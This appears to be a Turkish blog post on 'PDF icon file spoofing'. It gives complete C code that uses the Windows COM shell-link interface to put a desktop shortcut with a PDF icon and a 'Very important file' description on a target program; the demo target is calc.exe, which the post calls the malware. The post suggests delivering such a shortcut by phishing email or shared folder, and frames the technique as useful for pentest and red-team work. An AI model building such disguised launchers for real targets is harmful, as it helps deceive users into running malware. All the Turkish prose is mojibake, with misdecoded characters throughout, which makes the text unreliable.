---
title: PDF Icon File Spoofing
date: 2024-07-31 
---

Merhabalar, bu yazÄ±da File Icon Spoofing tekniÄŸini inceleyeceÄŸiz.

KÄ±saca tekniÄŸi Ã¶zetlemek gerekirse oluÅŸturulan malware'in programÄ±n icon'u deÄŸiÅŸtirilerek kullanÄ±cÄ±yÄ± yanÄ±ltma tekniÄŸidir. Bu sayede kullanÄ±cÄ±, ilgili malware'i zararsÄ±z bir dosya olarak gÃ¶rebilir. Malware iÃ§in belirlediÄŸiniz icon, bu konuda Ã¶rnek olarak gÃ¶sterileceÄŸi gibi bir PDF olabilir veya bir baÅŸka icon olabilir. TekniÄŸin, sosyal mÃ¼hendislik saldÄ±rÄ±larÄ± iÃ§in oldukÃ§a etkili bir yÃ¶ntem olabilir ve ayrÄ±ca Pentest ve Red Team Ã§alÄ±ÅŸmalarÄ±nda da kullanÄ±lÄ±ÅŸlÄ± olabilir.

Konunun daha iyi anlaÅŸÄ±lmasÄ± iÃ§in Ã¶rnek senaryo Ã¼zerinden ilerleyelim, bir ÅŸirketin iÃ§ aÄŸÄ±nÄ±n gÃ¼venliÄŸini test etmek amacÄ±yla gÃ¶revlendirilmiÅŸ bir pentester olduÄŸunuzu dÃ¼ÅŸÃ¼nÃ¼n. Åirket Ã§alÄ±ÅŸanlarÄ±nÄ±n kÃ¶tÃ¼ amaÃ§lÄ± dosyalarÄ± aÃ§ma konusunda ne kadar dikkatli olduklarÄ±nÄ± test etmeniz gerekiyor. Bu baÄŸlamda, kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mÄ±nÄ±zÄ± zararsÄ±z bir PDF dosyasÄ± olarak maskeleyerek, bir kimlik avÄ± e-postasÄ± aracÄ±lÄ±ÄŸÄ±yla veya paylaÅŸÄ±lan bir klasÃ¶re yerleÅŸtirerek gÃ¶nderebilirsiniz. EÄŸer bir Ã§alÄ±ÅŸan bu dosyayÄ± aÃ§arsa, dosya aslÄ±nda zararlÄ± yazÄ±lÄ±mÄ± Ã§alÄ±ÅŸtÄ±rarak sistemlerine eriÅŸim saÄŸlar.

## Code

> Bu konu iÃ§in kullandÄ±ÄŸÄ±m kod parÃ§asÄ±, S12 H4CK'in PDF Icon File Spoofing konusundan alÄ±nmÄ±ÅŸ ve tarafÄ±mca gÃ¼ncellenmiÅŸtir. Daha fazla detay iÃ§in Referanslar kÄ±smÄ±ndan makalesine gÃ¶z atabilirsiniz.

HazÄ±rlanan Ã¶rnek kod parÃ§asÄ±nÄ±n github link'ine eriÅŸmek iÃ§in [buraya](https://github.com/0xbekoo/maldev/tree/main/C/File-Icon-Spoofing) tÄ±klayabilirsiniz.

```c
#include <stdio.h>
#include <strsafe.h>
#include <wchar.h>
#include <ShlObj.h>
#include <objbase.h>
#include <Windows.h>

BOOL CreateShortcut(const wchar_t* TargetPath, const wchar_t* ShortcutPath, const wchar_t* IconPath ) {
    HRESULT         HRES; 
    IShellLink*     PSL = NULL;
    IPersistFile*   PPF = NULL;

    CoInitialize(NULL); 
    
    HRES = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (void**)&PSL);
    if (FAILED(HRES)) {
        wprintf(L"Failed to create IShellLink Object! Error Code:  0x%08X\n", HRES);
        return 1;
    }
    PSL->lpVtbl->SetPath(PSL, TargetPath);
    PSL->lpVtbl->SetIconLocation(PSL, IconPath, 0);
    PSL->lpVtbl->SetDescription(PSL, L"Very important file");

    HRES = PSL->lpVtbl->QueryInterface(PSL, &IID_IPersistFile, (void**)&PPF);
    if (FAILED(HRES)) {
        wprintf(L"Failed to interface! Error Code: 0x%08X\n", HRES);
        return 1;
    }
    HRES = PPF->lpVtbl->Save(PPF, ShortcutPath, TRUE);
    PPF->lpVtbl->Release(PPF);
    PSL->lpVtbl->Release(PSL);
    CoUninitialize();

    wprintf(L"Shortcut Created!\n");
    return 0;
}

int main()
{
    wchar_t TargetPath[MAX_PATH]    = L"C:\\Windows\\System32\\calc.exe";
    wchar_t IconPath[MAX_PATH]      = L"C:\\path\\to\\pdficon.ico";
    wchar_t ShortcutPath[MAX_PATH];
    HRESULT HRFolder;

    HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath);
    if (FAILED(HRFolder)) {
        wprintf(L"Failed to get Desktop Path! Error Code: 0x%08X\n", HRFolder);
        return 1;
    }
    StringCchCatW(ShortcutPath, MAX_PATH, L"\\Projects.lnk");
    wprintf(L"Merged Path: %s\n", ShortcutPath);
    
    if (CreateShortcut(TargetPath, ShortcutPath, IconPath) > 0) {
        wprintf(L"Failed to create Shortcut!\n");
        return -1;
    }
    return 0;
}
```

Kodlara detaylÄ±ca gÃ¶z atalÄ±m ve main iÃ§erisinden baÅŸlayalÄ±m:

```c
wchar_t TargetPath[MAX_PATH]    = L"C:\\Windows\\System32\\calc.exe";
wchar_t IconPath[MAX_PATH]      = L"C:\\path\\to\\pdficon.ico";
wchar_t ShortcutPath[MAX_PATH];
```

- **TargetPath:** Bu deÄŸiÅŸken, oluÅŸturulacak kÄ±sayolun hedef dosyasÄ±nÄ±n yolunu belirtir. Bu deÄŸiÅŸken bizim malware'in yolunu belirtir.
- **IconPath:** Bu deÄŸiÅŸken, oluÅŸturulacak kÄ±sayolun icon'unun yolunu belirtir. 
- **ShortcutPath:** Bu deÄŸiÅŸken, oluÅŸturulacak kÄ±sayolun yolunu belirtir. <br/> <br/>


```c
HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath);
if (FAILED(HRFolder)) {
    wprintf(L"Failed to get Desktop Path! Error Code: 0x%08X\n", HRFolder);
    return 1;
}
StringCchCatW(ShortcutPath, MAX_PATH, L"\\Projects.lnk");
wprintf(L"Merged Path: %s\n", ShortcutPath);
```

Bu kÄ±sÄ±mda ise ilk olarak **SHGetFolderPath** fonksiyonu ile desktop dizinin tam yolunu alÄ±yoruz. ArdÄ±ndan alÄ±nan dizin yoluna ise StringCchCatW aracÄ±lÄ±ÄŸÄ±yla oluÅŸturulacak kÄ±sayol ismi ile birleÅŸtiriyoruz. Bu sayede oluÅŸturulacak kÄ±sayol'un tam yolunu elde etmiÅŸ oluyoruz. 

Bu kÄ±sayol ismini **Projects.lnk** olarak ayarladÄ±m. Siz dilerseniz bunu deÄŸiÅŸtirebilirsiniz. <br/> <br/>

```c
if (CreateShortcut(TargetPath, ShortcutPath, IconPath) > 0) {
    wprintf(L"Failed to create Shortcut!\n");
    return -1;
}
```

Bu kÄ±sÄ±mda ise oluÅŸturduÄŸumuz CreateShortcut fonksiyonunu Ã§aÄŸÄ±rÄ±yoruz ve if ile bir karÅŸÄ±laÅŸtÄ±rma yapÄ±yoruz. EÄŸer CreateShortcut fonksiyonu 0'dan yÃ¼ksek yani 1 deÄŸerini dÃ¶ndÃ¼rÃ¼rse hata mesajÄ± ekrana bastÄ±rarak -1 ile programÄ± return ettiriyoruz. <br/> <br/>

```c
CoInitialize(NULL); 
    
HRES = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (void**)&PSL);
if (FAILED(HRES)) {
    wprintf(L"Failed to create IShellLink Object! Error Code:  0x%08X\n", HRES);
    return 1;
}
```

CreateShortcut fonksiyon iÃ§erisinde ise ilk olarak CoInitialize fonksiyonu ile COM bileÅŸenlerini baÅŸlatÄ±yoruz. Peki ama neden COM bileÅŸenlerini baÅŸlatÄ±yoruz? 

Ã‡Ã¼nkÃ¼ IShellLink ve IPersistFile interface'leri COM bileÅŸenleridir. Bu interface'ler bizim kÄ±sayol oluÅŸturmak iÃ§in kullanacaÄŸÄ±mÄ±z araÃ§lardÄ±r. DolayasÄ±yla bunlara eriÅŸmemiz iÃ§in COM bileÅŸenlerini baÅŸlatmamÄ±z gerekmektedir. 

ArdÄ±ndan CoCreateInstance fonksiyonu ile IShellLink interface'ini oluÅŸturuyoruz. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa hata mesajÄ± bastÄ±rarak programÄ± return ettiriyoruz. <br/> <br/>

```c
PSL->lpVtbl->SetPath(PSL, TargetPath);
PSL->lpVtbl->SetIconLocation(PSL, IconPath, 0);
PSL->lpVtbl->SetDescription(PSL, L"Very important file");

HRES = PSL->lpVtbl->QueryInterface(PSL, &IID_IPersistFile, (void**)&PPF);
if (FAILED(HRES)) {
    wprintf(L"Failed to interface! Error Code: 0x%08X\n", HRES);
    return 1;
}
```

Bu kod bloÄŸunda ise oluÅŸturduÄŸumuz IShellLink interface'ine **Target Path**, **Icon Path** ve **Description** ekliyoruz. Bu adÄ±mlar, oluÅŸturacaÄŸÄ±mÄ±z kÄ±sayolun Ã¶zelliklerini belirtir. 

ArdÄ±ndan QueryInterface fonksiyonu ile IPersistFile interface'ine eriÅŸim saÄŸlÄ±yoruz. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa hata mesajÄ± bastÄ±rarak programÄ± return ettiriyoruz. <br/> <br/>

```c
HRES = PPF->lpVtbl->Save(PPF, ShortcutPath, TRUE);
PPF->lpVtbl->Release(PPF);
PSL->lpVtbl->Release(PSL);
CoUninitialize();

wprintf(L"Shortcut Created!\n");
```

Son olarak ise Save fonksiyonu ile oluÅŸturduÄŸumuz kÄ±sayolu, main iÃ§erisinde oluÅŸturduÄŸumuz tam yoluna kaydediyoruz. ArdÄ±ndan IPersistFile ve IShellLink interface'lerini serbest bÄ±rakÄ±yoruz. CoUninitialize fonksiyonu ile COM bileÅŸenlerini sonlandÄ±rÄ±yoruz. Son olarak kÄ±sayolun oluÅŸturulduÄŸuna dair bir mesaj bastÄ±rÄ±yoruz. <br/> <br/>

## ProgramÄ± Ã‡alÄ±ÅŸtÄ±rma

ProgramÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda ise masaÃ¼stÃ¼nde kÄ±sayolumuz aÅŸaÄŸÄ±daki gibi gÃ¶zÃ¼kecektir:

![](../../../images/posts/file-spoofing/img1.png)

KÄ±sayolumuz aslÄ±nda pdf gibi gÃ¶zÃ¼kse de Ã¶zelliklerine gÃ¶z attÄ±ÄŸÄ±mÄ±zda aslÄ±nda farklÄ± bir program Ã§alÄ±ÅŸtÄ±racaktÄ±r:

![](../../../images/posts/file-spoofing/img2.png)

Ã–zelliklerine gÃ¶z attÄ±ÄŸÄ±mÄ±zda ise aslÄ±nda bu kÄ±sayolun **calc.exe** programÄ±nÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rmekteyiz.

## SonuÃ§

Bu konumda, icon file spoofing tekniÄŸini ele aldÄ±k. UnutmayÄ±n ki bu teknik, Pentest ve Red Team Ã§alÄ±ÅŸmalarÄ±nda da kullanÄ±lÄ±ÅŸlÄ± olabilir. 

UmarÄ±m faydalÄ± olmuÅŸtur, teÅŸekkÃ¼rler! ğŸš€

## References 

- [S12 H4CK - PDF Icon File Spoofing](https://medium.com/@s12deff/pdf-icon-file-spoofing-dbfd76476b82)
